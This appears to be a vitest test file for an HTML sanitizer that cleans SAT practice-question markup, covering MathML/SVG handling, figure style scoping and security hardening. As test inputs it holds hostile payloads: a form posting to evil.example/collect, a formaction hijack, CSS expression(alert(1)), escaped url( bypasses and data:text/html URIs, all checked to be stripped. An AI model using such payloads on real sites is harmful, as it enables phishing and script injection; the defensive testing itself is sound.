// Deep-equality parity against the differential harness's golden vectors
// (plan.md §8.2), plus the §6.2 pinned assertions that would otherwise be
// silently assumed: USE_PROFILES/ADD_*/FORBID_TAGS precedence, what survives
// only because of ADD_ATTR/ADD_TAGS, the figure-style rewrite's shape, its
// removal reasons, and the attribute hooks.

import { readFileSync } from "node:fs";
import path from "node:path";
import { gunzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import {
  type DroppedStyleBlock,
  SANITIZE_CONFIG,
  normalizeSatHtml,
  sanitizeSatHtml,
  satPurify,
  transformMfenced,
} from "./sat-html";

interface HtmlTransformCase {
  source: string;
  field: string;
  input: string;
  output: string;
}

const VECTORS_PATH = path.resolve(
  import.meta.dirname,
  "../../../../tests/domain/sat/upstream/vectors/html_transforms.json.gz",
);

function loadCases(): HtmlTransformCase[] {
  const gz = readFileSync(VECTORS_PATH);
  const json = JSON.parse(gunzipSync(gz).toString("utf-8")) as {
    cases: HtmlTransformCase[];
  };
  return json.cases;
}

describe("normalizeSatHtml — parity with liprep's upstream transforms", () => {
  const cases = loadCases();

  it("has a non-empty corpus", () => {
    expect(cases.length).toBeGreaterThan(0);
  });

  it("matches every golden vector", () => {
    const mismatches: string[] = [];
    for (const testCase of cases) {
      const actual = normalizeSatHtml(testCase.input);
      if (actual !== testCase.output) {
        mismatches.push(`${testCase.source} / ${testCase.field}`);
      }
    }
    expect(mismatches).toEqual([]);
  });
});

describe("normalizeSatHtml — Q39 fix", () => {
  it("gives the screen-reader-labelled blank pair the blank span", () => {
    const html =
      '<span aria-hidden="true">____</span><span class="sr-only">blank</span>';
    expect(normalizeSatHtml(html)).toBe(
      '<span class="sat-blank" aria-label="blank space"></span>',
    );
  });

  it("also gives a bare underscore run the accessible name (upstream does not)", () => {
    expect(normalizeSatHtml("____")).toBe(
      '<span class="sat-blank" aria-label="blank space"></span>',
    );
  });
});

describe("transformMfenced", () => {
  it("is a no-op when there is no mfenced element", () => {
    expect(transformMfenced("<p>plain</p>")).toBe("<p>plain</p>");
  });

  it("honours open/close/separators", () => {
    const html =
      '<math><mfenced open="[" close="]" separators=";"><mi>a</mi><mi>b</mi></mfenced></math>';
    const out = transformMfenced(html);
    expect(out).toContain("<mo>[</mo>");
    expect(out).toContain("<mo>;</mo>");
    expect(out).toContain("<mo>]</mo>");
    expect(out).not.toContain("mfenced");
  });
});

function sanitize(html: string) {
  return sanitizeSatHtml(html);
}

describe("SANITIZE_CONFIG precedence", () => {
  it("USE_PROFILES resets the tag set — mathMl-only tags need ADD_TAGS", () => {
    const bare = satPurify.sanitize("<annotation>x</annotation>", {
      USE_PROFILES: SANITIZE_CONFIG.USE_PROFILES,
    });
    expect(bare).not.toContain("annotation");

    const { html } = sanitize("<math><annotation>x</annotation></math>");
    expect(html).toContain("<annotation>");
  });

  it("FORBID_TAGS wins even over a tag its own profile would allow", () => {
    const { html } = sanitize(
      '<svg><foreignObject><div>x</div></foreignObject></svg>',
    );
    expect(html).not.toContain("foreignObject");
  });

  it("semantics/annotation/alttext survive only because ADD_TAGS/ADD_ATTR list them", () => {
    const { html } = sanitize(
      '<math alttext="x plus y"><semantics><mrow><mi>x</mi></mrow><annotation encoding="foo">x+y</annotation></semantics></math>',
    );
    expect(html).toContain("<semantics>");
    expect(html).toContain("<annotation");
    expect(html).toContain('alttext="x plus y"');
  });

  it("keeps <style> inside svg (not FORBID_TAGS'd)", () => {
    const { html } = sanitize("<svg><style>*{fill:red;}</style></svg>");
    expect(html).toContain("<style>");
  });

  // G5 audit (2026-09-20): both attributes are real, non-executable content
  // found in the full bank corpus but outside the plan's 204-sample
  // measurement — see artifacts/sat-practice/g5-report.json.
  it("keeps a stretchy fence's form attribute (MathML Core)", () => {
    const { html } = sanitize(
      '<math><mo stretchy="true" fence="true" form="prefix">(</mo><mi>x</mi><mo stretchy="true" fence="true" form="postfix">)</mo></math>',
    );
    expect(html).toContain('form="prefix"');
    expect(html).toContain('form="postfix"');
  });

  it("keeps isolation on an svg group (standard SVG presentation attribute)", () => {
    const { html } = sanitize('<svg><g isolation="isolate"><path d="M0 0"/></g></svg>');
    expect(html).toContain('isolation="isolate"');
  });
});

// Security review (2026-09-20): `form` in `ADD_ATTR` is a flat,
// non-element-scoped allow-list, so without the `uponSanitizeAttribute`
// scoping it permits orphan form-control association and DOMPurify's
// default HTML profile already allows the form-control tags themselves —
// together a native, no-JavaScript form-hijacking/phishing vector. These
// pin that both are closed, not just that MathML's own use of `form`
// survives (the positive cases above).
describe("form-control hardening", () => {
  it("drops form on a non-MathML element", () => {
    const { html } = sanitize('<div form="loginForm">x</div>');
    expect(html).not.toContain("form=");
  });

  it("drops form on an orphan input, button, textarea and select", () => {
    const { html: inputHtml } = sanitize(
      '<input form="loginForm" name="password" value="hijacked">',
    );
    expect(inputHtml).not.toContain("<input");
    expect(inputHtml).not.toContain("form=");
    expect(inputHtml).not.toContain("hijacked");

    const { html: buttonHtml } = sanitize(
      '<button form="loginForm" type="submit">Continue</button>',
    );
    expect(buttonHtml).not.toContain("<button");
    expect(buttonHtml).not.toContain("form=");
    expect(buttonHtml).toContain("Continue");

    const { html: textareaHtml } = sanitize('<textarea form="x">leak</textarea>');
    expect(textareaHtml).not.toContain("<textarea");
    expect(textareaHtml).not.toContain("form=");
    expect(textareaHtml).toContain("leak");

    const { html: selectHtml } = sanitize(
      '<select form="x"><option>a</option></select>',
    );
    expect(selectHtml).not.toContain("<select");
    expect(selectHtml).not.toContain("<option");
    expect(selectHtml).toContain("a");
  });

  it("drops a complete form with an attacker-controlled action", () => {
    const { html } = sanitize(
      '<form action="https://evil.example/collect" method="POST"><input name="x" value="y"></form>',
    );
    expect(html).not.toContain("<form");
    expect(html).not.toContain("action=");
    expect(html).not.toContain("method=");
    expect(html).not.toContain("<input");
  });

  it("drops formaction wherever it survives on any element", () => {
    const { html } = sanitize(
      '<button formaction="https://evil.example">go</button>',
    );
    expect(html).not.toContain("formaction");
  });
});

describe("figure <style> selector-prefix rewrite", () => {
  it("scopes every selector under [data-sat-fig=\"n\"], shape only", () => {
    const { html, droppedStyleBlocks } = sanitize(
      "<svg><style>*{stroke-linecap:butt;stroke-linejoin:round;}</style></svg>",
    );
    expect(droppedStyleBlocks).toEqual([]);
    expect(html).toMatch(/data-sat-fig="\d+"/);
    expect(html).toMatch(/\[data-sat-fig="\d+"\] \*\{/);
  });

  it("strips a comment glued between rules before parsing (real bank shape)", () => {
    const css = `
        .small {
            font: italic 13px Crimson;
        }

        .heavy {
            font: bold 30px sans-serif;
        }

        /* Note that the color of the text is set with the    *
            * fill property, the color property is for HTML only */
        .Rrrrr {
            font: italic 40px serif;
            fill: red;
        }
    `;
    const { html, droppedStyleBlocks } = sanitize(
      `<svg><style>${css}</style></svg>`,
    );
    expect(droppedStyleBlocks).toEqual([]);
    expect(html).toMatch(/\[data-sat-fig="\d+"\] \.small/);
    expect(html).toMatch(/\[data-sat-fig="\d+"\] \.heavy/);
    expect(html).toMatch(/\[data-sat-fig="\d+"\] \.Rrrrr/);
    expect(html).not.toContain("/*");
  });

  it("removes and reports a <style> not inside an <svg>", () => {
    const { html, droppedStyleBlocks } = sanitize(
      "<div><style>*{color:red;}</style></div>",
    );
    expect(html).not.toContain("<style>");
    expect(droppedStyleBlocks).toEqual<DroppedStyleBlock[]>([
      { reason: "not-in-svg", css: "*{color:red;}" },
    ]);
  });

  it("removes and reports a block containing @import", () => {
    const { html, droppedStyleBlocks } = sanitize(
      '<svg><style>@import url("x.css"); .a{color:red;}</style></svg>',
    );
    expect(html).not.toContain("<style>");
    expect(droppedStyleBlocks[0]?.reason).toBe("disallowed-token");
  });

  it("removes and reports a block containing url( in its body", () => {
    const { html, droppedStyleBlocks } = sanitize(
      "<svg><style>.a{background:url(x.png);}</style></svg>",
    );
    expect(html).not.toContain("<style>");
    expect(droppedStyleBlocks[0]?.reason).toBe("disallowed-token");
  });

  it("removes and reports a block it cannot parse as a plain comma list", () => {
    const { html, droppedStyleBlocks } = sanitize(
      "<svg><style>@media (min-width: 1px) { .a { color: red; } }</style></svg>",
    );
    expect(html).not.toContain("<style>");
    expect(droppedStyleBlocks[0]?.reason).toBe("unparsable-selector");
  });

  it("assigns each distinct svg its own id, stable across a re-sanitise", () => {
    const first = sanitize("<svg><style>*{fill:red;}</style></svg>");
    const second = sanitize("<svg><style>*{fill:blue;}</style></svg>");
    const idOf = (html: string) => html.match(/data-sat-fig="(\d+)"/)?.[1];
    expect(idOf(first.html)).not.toBe(idOf(second.html));
  });
});

describe("uponSanitizeAttribute hardening", () => {
  it("drops a style declaration containing url(", () => {
    const { html } = sanitize(
      '<div style="background: url(evil.png); color: red;">x</div>',
    );
    expect(html).not.toContain("url(");
    expect(html).toContain("color: red");
  });

  it("drops a style declaration containing expression(", () => {
    const { html } = sanitize(
      '<div style="width: expression(alert(1)); color: red;">x</div>',
    );
    expect(html).not.toContain("expression");
    expect(html).toContain("color: red");
  });

  it("drops a style declaration containing position", () => {
    const { html } = sanitize(
      '<div style="position: fixed; color: red;">x</div>',
    );
    expect(html).not.toContain("position");
    expect(html).toContain("color: red");
  });

  it("leaves clip-path/marker url(#…) attributes untouched (not style)", () => {
    const { html } = sanitize(
      '<svg><path clip-path="url(#a)" marker-end="url(#b)" d="M0 0"/></svg>',
    );
    expect(html).toContain('clip-path="url(#a)"');
    expect(html).toContain('marker-end="url(#b)"');
  });

  it("keeps a fragment href/xlink:href", () => {
    const { html } = sanitize(
      '<svg><use href="#icon" xlink:href="#icon"/></svg>',
    );
    expect(html).toContain('href="#icon"');
  });

  it("drops a non-fragment href", () => {
    const { html } = sanitize('<a href="https://evil.example/">x</a>');
    expect(html).not.toContain("href=");
  });

  it("keeps a data: URI on <img>", () => {
    const { html } = sanitize(
      '<img src="data:image/png;base64,AAAA" alt="x">',
    );
    expect(html).toContain("data:image/png");
  });

  it("drops a data: URI on a non-<img> element", () => {
    const { html } = sanitize('<div src="data:text/html,x">x</div>');
    expect(html).not.toContain("data:");
  });

  it("drops a data:image/svg+xml URI on <img>", () => {
    const { html } = sanitize(
      '<img src="data:image/svg+xml;base64,AAAA" alt="x">',
    );
    expect(html).not.toContain("data:");
  });

  it("drops a data:text/html URI on <img>", () => {
    const { html } = sanitize('<img src="data:text/html,x" alt="x">');
    expect(html).not.toContain("data:");
  });

  it("keeps data:image/jpeg and data:image/gif on <img>", () => {
    const jpeg = sanitize('<img src="data:image/jpeg;base64,AAAA" alt="x">');
    expect(jpeg.html).toContain("data:image/jpeg");

    const gif = sanitize('<img src="data:image/gif;base64,AAAA" alt="x">');
    expect(gif.html).toContain("data:image/gif");
  });

  it("drops a safe data:image/png URI on a non-<img> element", () => {
    const { html } = sanitize('<div src="data:image/png;base64,AAAA">x</div>');
    expect(html).not.toContain("data:");
  });

  it("keeps a data: URI on <img> with leading whitespace", () => {
    const { html } = sanitize(
      '<img src=" data:image/png;base64,AAAA" alt="x">',
    );
    expect(html).toContain("data:image/png");
  });

  it("keeps a data: URI on <img> with mixed-case scheme and type", () => {
    const { html } = sanitize(
      '<img src="DATA:Image/PNG;base64,AAAA" alt="x">',
    );
    expect(html.toLowerCase()).toContain("data:image/png");
  });
});

describe("CSS-escape bypass hardening", () => {
  it("drops a style declaration containing an escaped url( while keeping siblings", () => {
    const { html } = sanitize(
      '<div style="background: \\75rl(evil.png); color: red;">x</div>',
    );
    expect(html).not.toContain("\\75");
    expect(html).toContain("color: red");
  });

  it("removes and reports an svg <style> block containing an escaped url(", () => {
    const { html, droppedStyleBlocks } = sanitize(
      '<svg><style>.a{background:\\75rl(evil.png);}</style></svg>',
    );
    expect(html).not.toContain("<style>");
    expect(droppedStyleBlocks[0]?.reason).toBe("disallowed-token");
  });
});
